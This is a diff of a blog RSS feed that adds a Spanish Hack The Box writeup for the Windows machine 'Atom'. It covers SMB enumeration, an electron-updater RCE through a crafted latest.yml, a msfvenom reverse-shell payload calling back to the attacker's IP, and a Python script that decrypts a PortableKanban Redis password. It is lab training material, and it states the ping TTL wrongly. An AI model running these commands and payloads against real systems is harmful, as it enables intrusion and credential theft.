@@ -5,9 +5,600 @@
     <description>Articulos, Writeups, Htb, Programación y Noticias sobre Ciberseguridad</description>
     <link>http://localhost:4000/</link>
     <atom:link href="http://localhost:4000/feed.xml" rel="self" type="application/rss+xml"/>
-    <pubDate>Tue, 08 Aug 2023 01:58:58 +0000</pubDate>
-    <lastBuildDate>Tue, 08 Aug 2023 01:58:58 +0000</lastBuildDate>
+    <pubDate>Fri, 11 Aug 2023 02:39:21 +0000</pubDate>
+    <lastBuildDate>Fri, 11 Aug 2023 02:39:21 +0000</lastBuildDate>
     <generator>Jekyll v3.9.0</generator>
+    
+      <item>
+        <title>Maquina Atom - htb writeup</title>
+        <description>&lt;p&gt;El dia de hoy vamos a resolver &lt;code&gt;Atom&lt;/code&gt; de &lt;code&gt;hackthebox&lt;/code&gt; una maquina &lt;code&gt;windows&lt;/code&gt; de dificultad media, en esta ocasión comprometeremos el sistema aprovechandonos de la información lekeada de los recursos compartidos, donde explotaremos una vulnerabilidad de ejecución remota de comandos a traves &lt;code&gt;electron-builder&lt;/code&gt; donde ganaremos acceso a la maquian victima, despues usaremos un exploit con el que decencriptaremos una contraseña obtenida del servicio de &lt;code&gt;portablekanban&lt;/code&gt; y finalmente despues de una enumeración del servicio de &lt;code&gt;redis&lt;/code&gt; obtendremos una credencial con la que podremos conectarnos mediante winrm como el usuario &lt;code&gt;Administrator&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;Maquina curiosa asi que vamos a darle!.&lt;/p&gt;
+
+&lt;p&gt;Vamos a comenzar como de costumbre creando un directorio con el nombre de la maquina:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ mkdir Atom
+❯ ls
+
+ Atom
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Seguidamente con la funcion mkt crearemos nuestros directorios de trabajo:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ which mkt
+mkt () {
+	mkdir {nmap,content,exploits,scripts}
+}
+❯ mkt
+❯ ls
+ content   exploits   nmap   scripts
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h2 id=&quot;enumeracion&quot;&gt;ENUMERACION &lt;a href=&quot;#enumeracion&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;
+
+&lt;p&gt;Comenzaremos con la fase de Enumeracion, mandando una traza a la ip de la maquina victima con el comando &lt;code&gt;ping&lt;/code&gt;:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ ping -c 1 10.10.10.237
+PING 10.10.10.237 (10.10.10.237) 56(84) bytes of data.
+64 bytes from 10.10.10.237: icmp_seq=1 ttl=127 time=271 ms
+
+--- 10.10.10.237 ping statistics ---
+1 packets transmitted, 1 received, 0% packet loss, time 0ms
+rtt min/avg/max/mdev = 271.205/271.205/271.205/0.000 ms
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Vemos que la maquina nos responde, con un ttl de &lt;code&gt;63&lt;/code&gt; y por proximidad seria correspondiente a una maquina &lt;code&gt;linux&lt;/code&gt;.&lt;/p&gt;
+
+&lt;h3 id=&quot;escaneo-de-puertos&quot;&gt;ESCANEO DE PUERTOS&lt;/h3&gt;
+
+&lt;table&gt;
+  &lt;thead&gt;
+    &lt;tr&gt;
+      &lt;th&gt;Parámetro&lt;/th&gt;
+      &lt;th style=&quot;text-align: left&quot;&gt;Descripción&lt;/th&gt;
+    &lt;/tr&gt;
+  &lt;/thead&gt;
+  &lt;tbody&gt;
+    &lt;tr&gt;
+      &lt;td&gt;&lt;a href=&quot;#enumeracion&quot;&gt;-p-&lt;/a&gt;&lt;/td&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;Escaneamos todos los 65535 puertos.&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;&lt;a href=&quot;#enumeracion&quot;&gt;–open&lt;/a&gt;&lt;/td&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;Solo los puertos que estén abiertos.&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;&lt;a href=&quot;#enumeracion&quot;&gt;-v&lt;/a&gt;&lt;/td&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;Permite ver en consola lo que va encontrando (verbose).&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;&lt;a href=&quot;#enumeracion&quot;&gt;-oG&lt;/a&gt;&lt;/td&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;Guarda el output en un archivo con formato grepeable para que mediante una funcion de &lt;a href=&quot;https://s4vitar.github.io/&quot;&gt;S4vitar&lt;/a&gt; nos va a permitir extraer cada uno de los puertos y copiarlos sin importar la cantidad en la clipboard y asi al hacer ctrl_c esten disponibles&lt;/td&gt;
+    &lt;/tr&gt;
+  &lt;/tbody&gt;
+&lt;/table&gt;
+
+&lt;p&gt;Procedemos a escanear los puertos abiertos y lo exportaremos al archivo de nombre &lt;code&gt;openPorts&lt;/code&gt;:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-java&quot;&gt;❯ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.10.237 -oG openPorts
+Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
+Starting Nmap 7.92 ( https://nmap.org ) at 2023-08-11 00:35 GMT
+Initiating SYN Stealth Scan at 00:35
+Scanning 10.10.10.237 [65535 ports]
+Discovered open port 445/tcp on 10.10.10.237
+Discovered open port 80/tcp on 10.10.10.237
+Discovered open port 135/tcp on 10.10.10.237
+Discovered open port 443/tcp on 10.10.10.237
+Discovered open port 6379/tcp on 10.10.10.237
+Discovered open port 5985/tcp on 10.10.10.237
+Completed SYN Stealth Scan at 00:35, 26.77s elapsed (65535 total ports)
+Nmap scan report for 10.10.10.237
+Host is up, received user-set (0.20s latency).
+Scanned at 2023-08-11 00:35:14 GMT for 27s
+Not shown: 65529 filtered tcp ports (no-response)
+Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
+PORT     STATE SERVICE      REASON
+80/tcp   open  http         syn-ack ttl 127
+135/tcp  open  msrpc        syn-ack ttl 127
+443/tcp  open  https        syn-ack ttl 127
+445/tcp  open  microsoft-ds syn-ack ttl 127
+5985/tcp open  wsman        syn-ack ttl 127
+6379/tcp open  redis        syn-ack ttl 127
+
+Read data files from: /usr/bin/../share/nmap
+Nmap done: 1 IP address (1 host up) scanned in 26.89 seconds
+           Raw packets sent: 131081 (5.768MB) | Rcvd: 23 (1.012KB)
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h3 id=&quot;escaneo-de-version-y-servicios&quot;&gt;ESCANEO DE VERSION Y SERVICIOS&lt;/h3&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-java&quot;&gt;❯ nmap -sCV -p80,135,443,445,5985,6379 10.10.10.237 -oN targeted
+Starting Nmap 7.92 ( https://nmap.org ) at 2023-08-11 00:36 GMT
+Nmap scan report for 10.10.10.237
+Host is up (0.21s latency).
+
+PORT     STATE SERVICE      VERSION
+80/tcp   open  http         Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1j PHP/7.3.27)
+|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1j PHP/7.3.27
+| http-methods: 
+|_  Potentially risky methods: TRACE
+|_http-title: Heed Solutions
+135/tcp  open  msrpc        Microsoft Windows RPC
+443/tcp  open  ssl/http     Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1j PHP/7.3.27)
+| tls-alpn: 
+|_  http/1.1
+|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1j PHP/7.3.27
+| ssl-cert: Subject: commonName=localhost
+| Not valid before: 2009-11-10T23:48:47
+|_Not valid after:  2019-11-08T23:48:47
+|_http-title: Heed Solutions
+| http-methods: 
+|_  Potentially risky methods: TRACE
+|_ssl-date: TLS randomness does not represent time
+445/tcp  open  microsoft-ds Windows 10 Pro 19042 microsoft-ds (workgroup: WORKGROUP)
+5985/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
+6379/tcp open  redis        Redis key-value store
+Service Info: Host: ATOM; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+|_clock-skew: mean: 2h20m00s, deviation: 4h02m32s, median: -1s
+| smb2-time: 
+|   date: 2023-08-11T00:37:09
+|_  start_date: N/A
+| smb-security-mode: 
+|   account_used: guest
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: disabled (dangerous, but default)
+| smb2-security-mode: 
+|   3.1.1: 
+|_    Message signing enabled but not required
+| smb-os-discovery: 
+|   OS: Windows 10 Pro 19042 (Windows 10 Pro 6.3)
+|   OS CPE: cpe:/o:microsoft:windows_10::-
+|   Computer name: ATOM
+|   NetBIOS computer name: ATOM\x00
+|   Workgroup: WORKGROUP\x00
+|_  System time: 2023-08-10T17:37:13-07:00
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 63.19 seconds
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Visulizamos información interesante de los puertos escaneados:&lt;/p&gt;
+
+&lt;table&gt;
+  &lt;thead&gt;
+    &lt;tr&gt;
+      &lt;th&gt;Puerto&lt;/th&gt;
+      &lt;th&gt;Servicio&lt;/th&gt;
+      &lt;th&gt;Versión&lt;/th&gt;
+    &lt;/tr&gt;
+  &lt;/thead&gt;
+  &lt;tbody&gt;
+    &lt;tr&gt;
+      &lt;td&gt;80&lt;/td&gt;
+      &lt;td&gt;HTTP&lt;/td&gt;
+      &lt;td&gt;Apache httpd 2.4.46&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;135&lt;/td&gt;
+      &lt;td&gt;MSRPC&lt;/td&gt;
+      &lt;td&gt;Microsoft Windows RPC&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;443&lt;/td&gt;
+      &lt;td&gt;HTTPS&lt;/td&gt;
+      &lt;td&gt;Apache httpd 2.4.46&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;445&lt;/td&gt;
+      &lt;td&gt;SMB&lt;/td&gt;
+      &lt;td&gt;microsoft-ds Windows 10 Pro 19042&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;5985&lt;/td&gt;
+      &lt;td&gt;WINRM&lt;/td&gt;
+      &lt;td&gt;Microsoft HTTPAPI httpd 2.0&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;6379&lt;/td&gt;
+      &lt;td&gt;REDIS&lt;/td&gt;
+      &lt;td&gt;Redis key-value store&lt;/td&gt;
+    &lt;/tr&gt;
+  &lt;/tbody&gt;
+&lt;/table&gt;
+
+&lt;h2 id=&quot;explotacion&quot;&gt;EXPLOTACION &lt;a href=&quot;#explotacion&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;
+
+&lt;p&gt;Comenzamos usando &lt;code&gt;whatweb&lt;/code&gt;, para determinar las tecnologias que esta usando el servicio web.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ whatweb 10.10.10.237
+http://10.10.10.237 [200 OK] Apache[2.4.46], Bootstrap, Country[RESERVED][ZZ], Email[MrR3boot@atom.htb], HTML5, HTTPServer[Apache/2.4.46 (Win64) OpenSSL/1.1.1j PHP/7.3.27], IP[10.10.10.237], OpenSSL[1.1.1j], PHP[7.3.27], Script, Title[Heed Solutions]
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;La herramienta no nos reporta que estamos ante un &lt;code&gt;php&lt;/code&gt;, y si procedemos a abrir el servicio en el navegador vemos que pagina hace referencia a &lt;code&gt;heed Solutions&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Atom/atom1.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Ahora bien &lt;code&gt;nmap&lt;/code&gt; nos reporto que el puerto &lt;code&gt;445&lt;/code&gt; se encuentra abierto, asi que vamos a tratar de enumerar si existen recursos compartidos. Para ello usaremos &lt;code&gt;smbmap&lt;/code&gt; de la suite de &lt;code&gt;impacket&lt;/code&gt;.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ smbmap -H 10.10.10.237 -u 'null'
+[+] Guest session   	IP: 10.10.10.237:445	Name: 10.10.10.237                                      
+	Disk                                                  	Permissions	Comment
+	----                                                  	-----------	-------
+	ADMIN$                                            	NO ACCESS	Remote Admin
+	C$                                                	NO ACCESS	Default share
+	IPC$                                              	READ ONLY	Remote IPC
+	Software_Updates                                  	READ, WRITE	
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Vemos que tenemos permiso de lectura y ejecución en &lt;code&gt;Software_Updates&lt;/code&gt;, asi que vamos a listar los recursos que contiene.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ smbmap -H 10.10.10.237 -u 'null' -r 'Software_Updates'
+[+] Guest session   	IP: 10.10.10.237:445	Name: 10.10.10.237                                      
+	Disk                                                  	Permissions	Comment
+	----                                                  	-----------	-------
+	Software_Updates                                  	READ, WRITE	
+	.\Software_Updates\*
+	dr--r--r--                0 Fri Aug 11 00:51:43 2023	.
+	dr--r--r--                0 Fri Aug 11 00:51:43 2023	..
+	dr--r--r--                0 Fri Aug 11 00:48:27 2023	client1
+	dr--r--r--                0 Fri Aug 11 00:48:27 2023	client2
+	dr--r--r--                0 Fri Aug 11 00:48:27 2023	client3
+	fr--r--r--            35202 Fri Apr  9 11:18:08 2021	UAT_Testing_Procedures.pdf
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Vamos a traernos a nuestra maquina y abrir el archivo pdf.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ smbmap -H 10.10.10.237 -u 'null' --download 'Software_Updates/UAT_Testing_Procedures.pdf'
+[+] Starting download: Software_Updates\UAT_Testing_Procedures.pdf (35202 bytes)
+[+] File output to: /home/fmiracle/Machines/Aton/content/10.10.10.237-Software_Updates_UAT_Testing_Procedures.pdf
+❯ ls
+ 10.10.10.237-Software_Updates_UAT_Testing_Procedures.pdf
+❯ mv 10.10.10.237-Software_Updates_UAT_Testing_Procedures.pdf UAT_Testing_Procedures.pdf
+❯ ls
+ UAT_Testing_Procedures.pdf
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Si lo queremos ver en nuestro navegador, yo voy a compartirme un servicio web con &lt;code&gt;php&lt;/code&gt;, pero tu puedes hacerlo como mas te guste.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ php -S 0.0.0.0:80
+[Fri Aug 11 00:56:38 2023] PHP 7.4.33 Development Server (http://0.0.0.0:80) started
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Atom/atom2.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Vemos que contiene información acerca de una aplicación en &lt;code&gt;electron-builder&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;Si bajamos un poco observamos qmas información donde nos dice que para iniciar el proceso QA debemos de poner las actualizaciones en uno de los directorios con el nombre &lt;code&gt;client&lt;/code&gt; que curiosamente son los mismo cuando listamos los recursos compartidos con &lt;code&gt;smbmap&lt;/code&gt;.&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;Electron - builder : Una solución completa para empaquetar y crear una aplicación Electron lista para su distribución para macOS, Windows y Linux con soporte de “actualización automática”.&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;Si buscamos vulnerabilidades asociadas a &lt;code&gt;electron builder&lt;/code&gt;, encontramos  una de evasión de la validación de firmas que conduce a &lt;code&gt;RCE&lt;/code&gt; en Electron-Updater.&lt;/p&gt;
+
+&lt;p&gt;Basicamente esta vulnerabilidad se aprovecha de &lt;code&gt;Electron-Updater&lt;/code&gt; y nos permite ejecutar codigo malicioso en el software.&lt;/p&gt;
+
+&lt;p&gt;Te dejo el articulo para que puedas entenderlo mejor:&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;&lt;a href=&quot;https://blog.doyensec.com/2020/02/24/electron-updater-update-signature-bypass.html&quot;&gt;https://blog.doyensec.com/2020/02/24/electron-updater-update-signature-bypass.html&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Atom/atom3.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Para poder explotarla vamos a utilizar una estructura similar a la que nos comparten en el articulo y le pondremos la extensión &lt;code&gt;yml&lt;/code&gt;.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;version: 1.2.3
+path: http://10.10.16.2/test
+sha512: fjqwiofhqw21321 21ie21e2r
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;En la parte de &lt;code&gt;path&lt;/code&gt; vamos a indicarle que al ejecutarse realize una petición a nuestra ip, donde nos pondremos en escucha con &lt;code&gt;ncat&lt;/code&gt;. Y seguidamente vamos a subir en una de las carpetas &lt;code&gt;client&lt;/code&gt; nuestro archivo &lt;code&gt;yaml&lt;/code&gt;.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ smbclient  //10.10.10.237/Software_Updates -N
+Try &quot;help&quot; to get a list of possible commands.
+smb: \&amp;gt; dir
+  .                                   D        0  Fri Aug 11 01:18:55 2023
+  ..                                  D        0  Fri Aug 11 01:18:55 2023
+  client1                             D        0  Fri Aug 11 01:18:55 2023
+  client2                             D        0  Fri Aug 11 01:18:55 2023
+  client3                             D        0  Fri Aug 11 01:18:55 2023
+  UAT_Testing_Procedures.pdf          A    35202  Fri Apr  9 11:18:08 2021
+
+		4413951 blocks of size 4096. 1369525 blocks available
+smb: \&amp;gt; cd client1
+smb: \client1\&amp;gt; put latest.yml
+putting file latest.yml as \client1\latest.yml (0,1 kb/s) (average 0,1 kb/s)
+smb: \client1\&amp;gt; dir
+  .                                   D        0  Fri Aug 11 01:21:33 2023
+  ..                                  D        0  Fri Aug 11 01:21:33 2023
+  latest.yml                          A       79  Fri Aug 11 01:21:33 2023
+
+		4413951 blocks of size 4096. 1369525 blocks available
+smb: \client1\&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Despues de unos segundos recibimos la conexión, lo cual nos garantiza que efectivamente estamos aprovechandonos de la vulnerabilidad.&lt;/p&gt;
+
+&lt;p&gt;Lo que vamos a hacer ahora es crearnos un ejecutable malicioso con la ayuda de &lt;code&gt;msfvenom&lt;/code&gt; para poder obtener una reverse shell de la maquina victima.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ msfvenom -p windows/shell_reverse_tcp LHOST=10.10.16.2 LPORT=443 -f exe -o reverse.exe
+[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+[-] No arch selected, selecting arch: x86 from the payload
+No encoder specified, outputting raw payload
+Payload size: 324 bytes
+Final size of exe file: 73802 bytes
+Saved as: reverse.exe
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Una cosa a recalcar que como nos dice el articulo el archivo debemos de llamarlo de una forma especial usando el simbolo &lt;code&gt;’&lt;/code&gt;&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ mv reverse.exe r’everse.exe
+❯ ls
+ latest.yml   r’everse.exe   UAT_Testing_Procedures.pdf
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Ademas debemos de modificar nuestro archivo &lt;code&gt;yml&lt;/code&gt; especificando en el path el archivo y no olvidemos incluir el sha512 del ejecutable.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ sha512sum r’everse.exe
+d9d4eaac33d3ee234af8015c73198541b82a558877d27d7d03cc6bda270c02e001cfc2daafc050256c29974c7a278317dca0d71804668dab00d539559a30de31  r’everse.exe
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;El archivo nos quedaria de la siguiente forma:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;version: 1.2.3
+path: r’everse.exe 
+sha512: d9d4eaac33d3ee234af8015c73198541b82a558877d27d7d03cc6bda270c02e001cfc2daafc050256c29974c7a278317dca0d71804668dab00d539559a30de31
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Procedemos a subirlo en una de las carpetas &lt;code&gt;client&lt;/code&gt;, compartimos el ejecutable desde nuestra maquina con python y nos ponemos en escucha en el puerto establecido con &lt;code&gt;ncat&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;Recibimos la conexión como el usuario &lt;code&gt;jason&lt;/code&gt;.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;nmap.org/ncat )
+Ncat: Listening on :::443
+Ncat: Listening on 0.0.0.0:443
+Ncat: Connection from 10.10.10.237.
+Connection from 10.10.10.237:54130.
+Microsoft Windows [Version 10.0.19042.906]
+(c) Microsoft Corporation. All rights reserved.
+
+whoami
+whoami
+atom\jason
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Ahora podemos dirigirnos a su directorio personal y leer la primera flag &lt;code&gt;user.txt&lt;/code&gt;.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-cmd&quot;&gt;cd C:\Users\jason\Desktop
+
+dir
+dir
+ Volume in drive C has no label.
+ Volume Serial Number is 9793-C2E6
+
+ Directory of C:\Users\jason\Desktop
+
+04/02/2021  10:29 PM    &amp;lt;DIR&amp;gt;          .
+04/02/2021  10:29 PM    &amp;lt;DIR&amp;gt;          ..
+03/31/2021  02:09 AM             2,353 heedv1.lnk
+03/31/2021  02:09 AM             2,353 heedv2.lnk
+03/31/2021  02:09 AM             2,353 heedv3.lnk
+08/10/2023  05:27 PM                34 user.txt
+               4 File(s)          7,093 bytes
+               2 Dir(s)   5,622,317,056 bytes free
+
+type user.txt
+type user.txt
+5dcbc34fb2b0acaf6f9262acb7ec960e
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h2 id=&quot;elevacion-de-privilegios&quot;&gt;ELEVACION DE PRIVILEGIOS &lt;a href=&quot;#elevacion-de-privilegios&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;
+
+&lt;p&gt;Si enumeramos un poco el sistema, vemos en la carpeta Download un directorio referente a &lt;code&gt;PortableKanban&lt;/code&gt;.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-cmd&quot;&gt;cd Downloads
+
+dir
+dir
+ Volume in drive C has no label.
+ Volume Serial Number is 9793-C2E6
+
+ Directory of C:\Users\jason\Downloads
+
+04/02/2021  08:00 AM    &amp;lt;DIR&amp;gt;          .
+04/02/2021  08:00 AM    &amp;lt;DIR&amp;gt;          ..
+03/31/2021  02:36 AM    &amp;lt;DIR&amp;gt;          node_modules
+04/02/2021  08:21 PM    &amp;lt;DIR&amp;gt;          PortableKanban
+               0 File(s)              0 bytes
+               4 Dir(s)   5,622,136,832 bytes free
+
+C:\Users\jason\Downloads&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Si listamos el contenido obervamos varios archivos &lt;code&gt;dll&lt;/code&gt;.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-cmd&quot;&gt;cd PortableKanban
+
+dir
+dir
+ Volume in drive C has no label.
+ Volume Serial Number is 9793-C2E6
+
+ Directory of C:\Users\jason\Downloads\PortableKanban
+
+04/02/2021  08:21 PM    &amp;lt;DIR&amp;gt;          .
+04/02/2021  08:21 PM    &amp;lt;DIR&amp;gt;          ..
+02/27/2013  08:06 AM            58,368 CommandLine.dll
+11/08/2017  01:52 PM           141,312 CsvHelper.dll
+06/22/2016  09:31 PM           456,704 DotNetZip.dll
+04/02/2021  07:44 AM    &amp;lt;DIR&amp;gt;          Files
+11/23/2017  04:29 PM            23,040 Itenso.Rtf.Converter.Html.dll
+11/23/2017  04:29 PM            75,776 Itenso.Rtf.Interpreter.dll
+11/23/2017  04:29 PM            32,768 Itenso.Rtf.Parser.dll
+11/23/2017  04:29 PM            19,968 Itenso.Sys.dll
+11/23/2017  04:29 PM           376,832 MsgReader.dll
+07/03/2014  10:20 PM           133,296 Ookii.Dialogs.dll
+04/02/2021  07:17 AM    &amp;lt;DIR&amp;gt;          Plugins
+04/02/2021  08:22 PM             5,920 PortableKanban.cfg
+01/04/2018  09:12 PM           118,184 PortableKanban.Data.dll
+01/04/2018  09:12 PM         1,878,440 PortableKanban.exe
+01/04/2018  09:12 PM            31,144 PortableKanban.Extensions.dll
+04/02/2021  07:21 AM               172 PortableKanban.pk3.lock
+09/06/2017  12:18 PM           413,184 ServiceStack.Common.dll
+09/06/2017  12:17 PM           137,216 ServiceStack.Interfaces.dll
+09/06/2017  12:02 PM           292,352 ServiceStack.Redis.dll
+09/06/2017  04:38 AM           411,648 ServiceStack.Text.dll
+01/04/2018  09:14 PM         1,050,092 User Guide.pdf
+              19 File(s)      5,656,416 bytes
+               4 Dir(s)   5,625,991,168 bytes free
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Si tratamos de buscar vulnerabilidades asociadas a &lt;code&gt;PortableKanban&lt;/code&gt;, vemos un exploit con el podemos desencriptar una contraseña.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ searchsploit portablekanban
+------------------------------------------------------- ---------------------------------
+ Exploit Title                                         |  Path
+------------------------------------------------------- ---------------------------------
+PortableKanban 4.3.6578.38136 - Encrypted Password Ret | windows/local/49409.py
+------------------------------------------------------- ---------------------------------
+Shellcodes: No Results
+Papers: No Results
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Vimos anteriormente cuando listamos los archivos de &lt;code&gt;portablekanban&lt;/code&gt; un archivo de configuración &lt;code&gt;PortableKanban.cfg&lt;/code&gt; que si lo leemos encontramos una contraseña encryptada.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-cmd&quot;&gt;type PortableKanban.cfg
+{&quot;RoamingSettings&quot;:{&quot;DataSource&quot;:&quot;RedisServer&quot;,&quot;DbServer&quot;:&quot;localhost&quot;,&quot;DbPort&quot;:6379,&quot;DbEncPassword&quot;:&quot;Odh7N3L9aVSeHQmgK/nj7RQL8MEYCUMb&quot;,&quot;DbServer2&quot;:&quot;&quot;,&quot;DbPort2&quot;:6379,&quot;DbEncPassword2&quot;:&quot;&quot;,&quot;DbIndex&quot;:0,&quot;DbSsl&quot;:false,&quot;DbTimeout&quot;:10,&quot;FlushChanges&quot;:true,&quot;UpdateInterval&quot;:5,&quot;AutoUpdate&quot;:true,&quot;Caption&quot;:&quot;My Tasks&quot;,&quot;RightClickAction&quot;:&quot;Nothing&quot;,&quot;DateTimeFormat&quot;:&quot;ddd, M/d/yyyy h:mm tt&quot;,&quot;BoardForeColor&quot;:&quot;WhiteSmoke&quot;,&quot;BoardBackColor&quot;:&quot;DimGray&quot;,&quot;ViewTabsFont&quot;:&quot;Segoe UI, 9pt&quot;,&quot;SelectedViewTabForeColor&quot;:&quot;WhiteSmoke&quot;,&quot;SelectedViewTabBackColor&quot;:&quot;Black&quot;,&quot;HeaderFont&quot;:&quot;Segoe UI, 11.4pt&quot;,&quot;HeaderShowCount&quot;:true,&quot;HeaderShowLimit&quot;:true,&quot;HeaderShowEstimates&quot;:true,&quot;HeaderShowPoints&quot;:false,&quot;HeaderForeColor&quot;:&quot;WhiteSmoke&quot;,&quot;HeaderBackColor&quot;:&quot;Gray&quot;,&quot;CardFont&quot;:&quot;Segoe UI, 11.4pt&quot;,&quot;CardLines&quot;:3,&quot;CardTextAlignment&quot;:&quot;Center&quot;,&quot;CardShowMarks&quot;:true,&quot;CardShowInitials&quot;:false,&quot;CardShowTags&quot;:true,&quot;ThickTags&quot;:false,&quot;DefaultTaskForeColor&quot;:&quot;WhiteSmoke&quot;,&quot;DefaultTaskBackColor&quot;:&quot;Gray&quot;,&quot;SelectedTaskForeColor&quot;:
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;Recordemos que los archivos de configuración muchas veces contienen contraseñas ya sean encriptadas o en texto claro.&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;Como ya contamos con una contraseña, ahora vamos a modificar un poco el exploit de tal manera que nos muestre la contraseña en texto claro.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;import json
+import base64
+from des import * #python3 -m pip install des
+import sys
+
+hash = 'Odh7N3L9aVSeHQmgK/nj7RQL8MEYCUMb'
+
+hash = base64.b64decode(hash.encode('utf-8'))
+key = DesKey(b&quot;7ly6UznJ&quot;)
+print(key.decrypt(hash,initial=b&quot;XuVUm5fR&quot;,padding=True).decode('utf-8'))
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Ejecutamos el exploit y obtenemos la contraseña en texto claro.&lt;/p&gt;
+
